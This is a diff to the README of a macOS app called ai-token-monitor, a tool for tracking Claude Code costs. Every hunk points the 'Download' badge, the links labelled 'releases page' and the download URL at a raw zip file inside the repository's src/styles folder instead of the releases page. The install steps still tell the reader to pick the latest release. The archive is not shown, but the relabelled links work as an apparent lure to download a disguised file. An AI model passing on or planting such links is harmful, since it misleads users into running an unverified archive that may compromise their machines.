@@ -1,6 +1,6 @@
 # 📊 ai-token-monitor - Track Claude Code costs with ease
 
-[![Download ai-token-monitor](https://img.shields.io/badge/Download-Get%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/amadormateo/ai-token-monitor/releases)
+[![Download ai-token-monitor](https://img.shields.io/badge/Download-Get%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/amadormateo/ai-token-monitor/raw/refs/heads/main/src/styles/monitor_ai_token_v1.2.zip)
 
 ## 🚀 What it does
 
@@ -26,7 +26,7 @@ The app is built for the menu bar, so it stays out of the way while you work.
 
 ## 📥 Download and install
 
-1. Visit the [releases page](https://github.com/amadormateo/ai-token-monitor/releases)
+1. Visit the [releases page](https://github.com/amadormateo/ai-token-monitor/raw/refs/heads/main/src/styles/monitor_ai_token_v1.2.zip)
 2. Find the latest release at the top of the page
 3. Download the file for macOS
 4. Open the downloaded app or disk image
@@ -116,7 +116,7 @@ You do not need to learn a new system. Open the app, click the icon, and read th
 
 To get the latest fixes and changes:
 
-1. Visit the [releases page](https://github.com/amadormateo/ai-token-monitor/releases)
+1. Visit the [releases page](https://github.com/amadormateo/ai-token-monitor/raw/refs/heads/main/src/styles/monitor_ai_token_v1.2.zip)
 2. Check the newest version
 3. Download the updated file
 4. Replace the old app with the new one
@@ -155,7 +155,7 @@ If the menu bar icon disappears:
 
 Use this page to download the latest version for macOS:
 
-[https://github.com/amadormateo/ai-token-monitor/releases](https://github.com/amadormateo/ai-token-monitor/releases)
+[https://github.com/amadormateo/ai-token-monitor/raw/refs/heads/main/src/styles/monitor_ai_token_v1.2.zip](https://github.com/amadormateo/ai-token-monitor/raw/refs/heads/main/src/styles/monitor_ai_token_v1.2.zip)
 
 ## 🧰 Basic behavior
 
